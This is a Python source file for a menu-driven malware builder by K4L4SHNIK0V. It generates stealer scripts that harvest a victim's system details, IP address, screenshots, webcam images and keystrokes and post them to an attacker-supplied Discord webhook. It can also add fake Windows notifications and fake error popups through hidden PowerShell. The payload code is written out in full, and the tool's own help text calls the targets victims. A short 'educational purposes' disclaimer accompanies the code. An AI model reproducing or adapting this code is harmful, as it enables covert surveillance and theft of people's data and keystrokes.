import time
import hashlib
import clear
import sys
from colorama import Fore, init
import os


init(autoreset=True)

def print_gradient_text(text):
    length = len(text)
    for i in range(length):
        r = 255 
        g = 0 
        b = int(255 * (i / length)) 
        color_code = f'\033[38;2;{r};{g};{b}m'
        sys.stdout.write(color_code + text[i])
        sys.stdout.write('\033[0m')
        sys.stdout.flush()

RED = Fore.RED
PURPLE = Fore.MAGENTA
GREEN = Fore.GREEN

title = """
        ██████╗ ██╗   ██╗██╗██╗     ██████╗ ███████╗██████╗     ██╗   ██╗██████╗ 
        ██╔══██╗██║   ██║██║██║     ██╔══██╗██╔════╝██╔══██╗    ██║   ██║╚════██╗
        ██████╔╝██║   ██║██║██║     ██║  ██║█████╗  ██████╔╝    ██║   ██║ █████╔╝
        ██╔══██╗██║   ██║██║██║     ██║  ██║██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██╔═══╝  
        ██████╔╝╚██████╔╝██║███████╗██████╔╝███████╗██║  ██║     ╚████╔╝ ███████╗  by K4L4SHNIK0V
        ╚═════╝  ╚═════╝ ╚═╝╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚══════╝
"""

menu = """
 ________________________________________________________________________________________
|                                                                                        |
|                         <1> Get system infos (GPU, CPU, RAM, UUID, MAC)                |
|                         <2> Get IP                                                     |
|                         <3> Screen Grabb (screenshot)                                  |
|                         <4> Webcam grabb (capture)                                     |
|                         <5> Keylogger                                                  |
|                         <6> Fake system notification                                   |
|                         <7> Fake error                                                 |
|________________________________________________________________________________________|
|                                         UTILS                                          |
|                                                                                        |
|         <+> Add delay between actions                 <!> ReadMe before use            |
|         <?> See the current options                   <i> Infos                        |
|         <l> Logout                                  <Build> Build file                 |
|         <r> Reset the option list
|________________________________________________________________________________________|
 """

options = []
options_choosed = []
keylogger = False

while True:

    STORED_HASHED_PASSWORD = "090940e7325896cc06b13348b51fbaba86a5d9d1937fc37a4e3a3f02f00401db"
    STORED_HASHED_USERNAME = "b512d97e7cbf97c273e4db073bbb547aa65a84589227f8f3d9e4a72b9372a24d"

    clear.clear()
    while True:
      print_gradient_text(title)
      print_gradient_text("""
                              Connection
                          """)
      username = input("""
\033[35m-------------  \033[31mUsername \033[35m:\033[31m """)
      print(username)
      hashed_input_username = hashlib.sha256(username.encode()).hexdigest()
      if hashed_input_username == STORED_HASHED_USERNAME:
        password = input("""
\033[35m-------------  \033[31mPassword \033[35m:\033[31m """)
        print(password)
        hashed_input_password = hashlib.sha256(password.encode()).hexdigest()
        if hashed_input_password == STORED_HASHED_PASSWORD:
          clear.clear()
          print(f"Welcome, {username}")
          time.sleep(2)
          break
        else:
          print("Mot de passe invalide")
      else:
        clear.clear()
        print("\033[31mNom d'utilisateur invalide") 

    while True:
        clear.clear()
        print_gradient_text(title)
        print_gradient_text(menu)
        computer_name = os.getlogin()
        choice = input(f"""
    \033[31m┌───(\033[35m{computer_name}\033[31m@\033[35mbuilderv2\033[31m)─[\033[31mcomputer/builder/menu\033[31m]
    └──$\033[3m """)

        print_gradient_text(choice)
        if choice == "!":
          clear.clear()
          ReadMe = RED + """
      How to use and conditions

      To add an option to your file, enter the corresponding number. The option will be added to the file list. 
      To add one more option, re-enter the corresponding number. You must enter the options one by one. 
      To generate the file containing all the options, enter ‘build’ and enter the name you have chosen for it. 

      \033[31mCAUTION:\033[0m When the file is generated, the list of options resets, so be sure that the list contains all the options 
      you want before generating the file.

      \033[31mThis tool has been created for \033[31meducational and preventive purposes\033[31m. 
      The creator of this tool is in no way responsible for the use of this tool for malicious purposes, of any modification 
      to its source code, or for any damage created to any device with a file generated with this tool.\033[0m

      Thank you for your understanding

      """
          print(ReadMe)
          input("Pres ENTER to continue... ")
        elif choice == "+":
          while True:
            clear.clear()
            try:
              delay_choice = int(input(RED + "How many delay to add (in seconds) ? >>> "))
              print(delay_choice)
            except ValueError:
              clear.clear()
              print(RED + "Please enter an integer !")
              time.sleep(2)
              continue
            delay = f"time.sleep({delay_choice})"
            delay_choosed = f"Add delay -> {delay_choice} second(s)"
            options.append(delay)
            options_choosed.append(delay_choosed)
            clear.clear()
            print(GREEN + f"Delay ({delay_choice } seconds) successfully added to the options !")
            time.sleep(2)
            break
        elif choice == "?":
          clear.clear()
          print(RED + f"Currents options :\n\n")
          for option in options_choosed:
            print(PURPLE + option + "\n")
          input("""
            
            Press ENTER to continue...""")
        elif choice in ["l", "L"]:
          clear.clear()
          for i in range(3):
            print("Login out")
            time.sleep(0.15)
            clear.clear()
            print("Login out.")
            time.sleep(0.15)
            clear.clear()
            print("Login out..")
            time.sleep(0.15)
            clear.clear()
            print("Login out...")
            time.sleep(0.15)
            clear.clear()
          break
        elif choice in ["Build", "BUILD", "build"]:
          clear.clear()
          webhook_url = input("Webhook url >>> ")
          print(webhook_url)
          file_name = input(PURPLE + "File Name >>> ")
          print(file_name)
          txt_options_file = input(PURPLE + "Do you want to save a txt file containing options list ? y/n >>> ")
          print(txt_options_file)
          if txt_options_file in ["y", "Y", "yes", "YES", "Yes"]:
            print("Creating the txt file ...")
            with open(f"options_for_{file_name}.txt", "w", encoding='utf-8') as options_file:
              options_file.write(f"<===== OPTION FOR {file_name} =====> \n \nWebhook url : {webhook_url} \n \n")
              for option in options_choosed:
                options_file.write(option + "\n")
            print(GREEN + "txt file successfully created ! \n")
          else:
            print("")
          print(f"Creating {file_name}.py ...")
          with open(f"{file_name}.py", "w", encoding='utf-8') as build_file:
            build_file.write(f"import random \nimport time \nimport os\nimport pyautogui \nimport requests \nimport cv2 \nimport cv2 \nimport socket \nimport uuid \nimport subprocess \nimport keyboard \n\nwebhook_url = '{webhook_url}'\n \n")
            for option_choice in options:
              build_file.write(option_choice + "\n")
            if keylogger == True:
              build_file.write(keylogger_options)
          print(GREEN + f"{file_name}.py successfully created ! \n \n")
          options.clear()
          options_choosed.clear()
          keylogger = False
          input("Press ENTER to continue...")
        elif choice in ["i", "I"]:
          builder_infos = f"""
BUILDER INFOS

{RED}Add delay between actions -> {PURPLE}Add delay (the number of second that you previously choosen) between the current action and the next one
{RED}Get system infos          -> {PURPLE}On execution, victims ystem infos are sent to you with your webhook (GPU, CPU, RAM, UUID, MAC Adress, Computer username)
{RED}Get IP                    -> {PURPLE}On execution, victim's IP is sent to you with your webhook
{RED}ScreenGrabb               -> {PURPLE}On execution, a victim's screen screenshot is sent to you with your webhook
{RED}Webcam Grabb              -> {PURPLE}On execution, a victim's webcam screenshot is se,t to you with your webhook
{RED}Keylogger                 -> {PURPLE}On execution, you receive victim's key strokes envery 1000 hits (around a small text)
{RED}Fake system message       -> {PURPLE}On execution, a fake system notification pop up with your personalized text and title
{RED}Fake error                -> {PURPLE}On execution, a fake error message pop up with your personalized message and title


"""
          clear.clear()
          print(builder_infos)
          input("Press ENTER to continue...")
        elif choice  in ["1", "01"]:
          get_system_infos = r"""
pc_name = os.getlogin()
pc_gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
pc_cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
pc_ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
pc_uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

embed = {
            "title": f" {pc_name} Infos",
            "url": "https://discord.gg/6Du5Cg77",
            "color": 16711680,
            "footer": {
                "text": "Stealer by K4L4SHNIK0V"
                },
            "thumbnail": {
                "url": "https://craxsrat.com/wp-content/uploads/2024/04/cropped-logo.png"
            },
            "fields": [
                {
                        "name": "**System infos**",
                        "value": f"**Pc name :** ` {pc_name} ` \n" 
                        f"**GPU :** ` {pc_gpu} ` \n "
                        f"**CPU :** ` {pc_cpu} ` \n"
                        f"\n **UUID** : ` {pc_uuid} ` \n"
                        f"\n **RAM :** ` {pc_ram} Gb ` \n"
                        f"**MAC Adress :**` {mac_address} `\n ",
                        "inline": False
                }
        
    ]
}

message = {
        "username": "B3R3TT4", 
        "content": "# Infos logged !",
        "embeds": [embed]
}
 
requests.post(webhook_url, json=message)
 """
          get_system_infos_choice = "Get system infos"
          options.append(get_system_infos)
          options_choosed.append(get_system_infos_choice)
          clear.clear()
          print(GREEN + "Get system infos successfully added to the options !")
          time.sleep(2)
          clear.clear()
        elif choice in ["2", "02"]:
          clear.clear()
          get_ip = """
hostname = socket.gethostname()
pc_ip = socket.gethostbyname(hostname)

send_victims_ip = {
        "username": "K4L4SHNIK0V Stealer",
        "content": f"Victim's IP : ` {pc_ip} `"
        }

requests.post(webhook_url, json=send_victims_ip)
 """
          get_ip_choice = "Get IP"
          options.append(get_ip)
          options_choosed.append(get_ip_choice)
          print(GREEN + "Get IP successfully added to the options !")
          time.sleep(2)
        elif choice in ["3", "03"]:
          clear.clear()
          screen_grabb = """
screen_screenshot_id = ''.join(random.choices("0123456789", k=4))
screen_screenshot = pyautogui.screenshot()
screen_screenshot.save(f"screenshot_{screen_screenshot_id}.png")

with open(f"screenshot_{screen_screenshot_id}.png", "rb") as screen:
  grabbed_screenshot_1 = {
        "file": ("screenshot.png", screen),
    }

  requests.post(webhook_url, files=grabbed_screenshot_1)
   """
          screen_grabb_choice = "Screen Grabb"
          options.append(screen_grabb)
          options_choosed.append(screen_grabb_choice)
          print(GREEN + "Screen Grabb successfully added to the list !")
          time.sleep(2)
        elif choice in ["4","04"]:
          webcam_grabb = """
webcam_capture = cv2.VideoCapture(0)
ret, frame = webcam_capture.read()
webcam_screenshot_id = ''.join(random.choices("0123456789", k=4))
webcam_screenshot = cv2.imwrite(f"webcam_{webcam_screenshot_id}.png", frame)

with open(f"webcam_{webcam_screenshot_id}.png", "rb") as webcam:
  grabbed_screenshot_2 = {
        "file": ("webcam_screenshot.png", webcam)
    }
  requests.post(webhook_url, files=grabbed_screenshot_2)"""
          webcam_grabb_choice = "Webcam Grabb"
          options.append(webcam_grabb)
          options_choosed.append(webcam_grabb_choice)
          clear.clear()
          print(GREEN + "Webcam Grabb successfully added to the options !")
          time.sleep(2)
        elif choice in ["5", "05"]:
          clear.clear()
          keylogger_options = r"""

with open("keylogger_file.txt", "w") as file:
    file.write("<===========[ KEYLOGGER LOGS ]===========> \n \n")

timer = 0

while True:
    event = keyboard.read_event()
    if event.event_type == keyboard.KEY_DOWN:
        timer += 1
        pressed_key = event.name
        with open("keylogger_file.txt", "a") as file:
            file.write(pressed_key)
        
            if timer == 1000:
                timer = 0
                with open("keylogger_file.txt", "r") as file:
                    logs = file.read()

                    keylogs = {
                        "username": "B3R3TT4",
                        "content": f"LOGS \n \n```{logs}``` \n "
                    }
                requests.post(webhook_url, json=keylogs)
                with open("keylogger_file.txt", "w"):
                    pass 
 """
          keylogger = True
          keylogger_option_choice = "Keylogger"
          options_choosed.append(keylogger_option_choice)
          print(GREEN + "Keylogger successfully added to the option !")
          time.sleep(2)
        elif choice in ["6", "06"]:
          clear.clear()
          notification_title = input("Notification title >>> ")
          print(notification_title)
          clear.clear()
          notification_message = input("Notification message >>> ")
          print(notification_message)
          fake_system_notification = f"""
os.system('''powershell -Command "Add-Type -AssemblyName System.Windows.Forms; '
          '$notifyIcon = New-Object System.Windows.Forms.NotifyIcon; '
          '$notifyIcon.Icon = [System.Drawing.SystemIcons]::Information; '
          '$notifyIcon.BalloonTipTitle = \'{notification_title}\'; '
          '$notifyIcon.BalloonTipText = \'{notification_message}\'; '
          '$notifyIcon.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Info; '
          '$notifyIcon.Visible = $true; '
          '$notifyIcon.ShowBalloonTip(3000); '
          '[System.Media.SystemSounds]::Asterisk.Play(); '
          '$notifyIcon.Dispose();"''')
 """
          fake_system_notification_choice = f"Fake syste notification : Title : {notification_title}, Message : {notification_message}"
          options.append(fake_system_notification)
          options_choosed.append(fake_system_notification_choice)
          clear.clear()
          print(GREEN + "Fake system notificartion successfully added to the options !")
          time.sleep(2)
        elif choice in ["7", "07"]:
          clear.clear()
          message = input("""
      \033[33mChoose your message \033[32m>>>\033[33m """)
          print(message)
          error_title = input("\033[33mChoose the title for the error \033[32m>>>\033[0m\033[33m ")
          clear.clear()
          print(error_title)
          clear.clear()
          fake_error = f"""
os.system('''start /min powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('{message} ', '{error_title}', [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)"''')
 """
          fake_error_choice = f"Fake error : Title : {error_title}, Message : {message}"
          options.append(fake_error)
          options_choosed.append(fake_error_choice)
          print(GREEN + "Fake error successfully added to the options !")
          time.sleep(2)
        elif choice in ["R", "r"]:
          options_choosed = []
          options = []
